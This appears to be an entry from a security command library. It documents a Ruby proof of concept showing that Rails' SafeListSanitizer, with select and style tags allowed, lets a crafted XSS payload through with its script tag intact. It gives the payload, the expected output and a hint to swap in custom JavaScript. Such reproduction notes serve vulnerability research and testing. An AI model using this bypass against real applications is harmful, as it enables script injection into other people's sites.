---
id: cmd-uuid-1
data: >-
  tags = %w(select style)

  puts "------------------------------------------------------------------"

  puts "use Rails::Html::SafeListSanitizer.new.sanitize, allow select/style tag"

  puts "input: <select<style/>W<xmp<script>alert(1)</script>"

  puts "output:
  "+Rails::Html::SafeListSanitizer.new.sanitize("<select<style/>W<xmp<script>alert(1)</script>",
  tags: tags).to_s

  puts "------------------------------------------------------------------"
tags:
  - xss
  - demo
type: command
output: |-
  input: <select<style/>W<xmp<script>alert(1)</script>
  output: <select><style>W<script>alert(1)</script></style></select>
executor: ruby
platforms:
  - Ruby
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:25.828Z'
verified: false
validated: true
submitted: true
---
# rails-sanitizer-xss-bypass-demo

## Command

```ruby
tags = %w(select style)
puts "------------------------------------------------------------------"
puts "use Rails::Html::SafeListSanitizer.new.sanitize, allow select/style tag"
puts "input: <select<style/>W<xmp<script>alert(1)</script>"
puts "output: "+Rails::Html::SafeListSanitizer.new.sanitize("<select<style/>W<xmp<script>alert(1)</script>", tags: tags).to_s
puts "------------------------------------------------------------------"
```

## Description

This Ruby command reproduces the XSS bypass in a JRuby environment by configuring tags, providing malicious input, sanitizing it, and printing the result to show preserved script.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| tags | Array of allowed tags like %w(select style) | Yes |
| input | Malicious HTML string | Yes |

## Examples

### Basic Usage

```ruby
tags = %w(select style)
# ... full command as above
```

### Advanced Usage

Modify input for different payloads:

```ruby
# Replace alert(1) with custom JS
puts "output: "+Rails::Html::SafeListSanitizer.new.sanitize(custom_input, tags: tags).to_s
```

## Expected Output

Demonstrates input and output with script tag intact: "output: <select><style>W<script>alert(1)</script></style></select>"

## Related

- [[commands/rails-sanitizer-direct-fragment-test]]
- [[procedures/Sanitize-Input-and-Verify-Script-Preservation]]
